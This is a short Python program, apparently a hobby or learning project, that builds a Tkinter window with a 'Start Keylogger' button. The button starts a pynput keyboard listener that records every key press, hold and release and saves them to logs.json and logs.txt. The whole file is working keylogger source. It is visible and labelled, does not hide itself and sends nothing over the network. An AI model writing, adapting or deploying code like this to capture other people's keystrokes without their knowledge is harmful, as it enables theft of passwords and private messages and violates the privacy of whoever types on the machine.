from pynput import keyboard
import tkinter as tk
from tkinter import *
import json

root = tk.Tk()
root.geometry("250x350")  
root.title("Keylogger Page")
root.configure(bg="cyan") 

key_list = []
x = False
key_strokes = ""


def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)


def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)


def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f' {key} '})
        x = True
    if x == True:
        key_list.append({'Held': f' {key} '})
    update_json_file(key_list)


def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f' {key} '})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))


def butaction():
    print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json'")

    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


empty = Label(root, text="Keylogger", bg="white", fg="blue", font=("Arial", 16))
empty.grid(row=0, column=0, sticky='w', padx=10, pady=10)

black_space = Label(root, bg="cyan", width=50, height=5)
black_space.grid(row=1, column=0)

button = Button(root, text="Start Keylogger", command=butaction, bg="blue", fg="white", font=("Arial", 12))
button.grid(row=2, column=0, pady=10)  

root.mainloop()